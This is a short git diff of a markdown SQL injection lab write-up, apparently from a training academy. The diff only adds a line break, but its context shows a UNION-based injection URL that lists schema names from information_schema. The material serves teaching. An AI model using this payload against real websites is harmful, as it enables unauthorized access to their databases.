@@ -64,7 +64,7 @@
 
 ### Find database name:
 
-**To find database name we have different payloads but I used this one:**
+**To find database name we have different payloads but I used this one:**<br>
 ***`URL: XYZ.online/post.php?id=1'+AND+1=2+UNION+SELECT+"S1"+"S2"+GROUP_CONCAT(SCHEMA_NAME)+"S4"+"S5"+"S6"+"S7"+"S8"+"S9"+"S10"+FROM+information_schema.schemata+--+-`***
 
 <img src="../static/image/SQLi-img/voorivex-academy-sqli1-6.png" alt="Numbers payload">
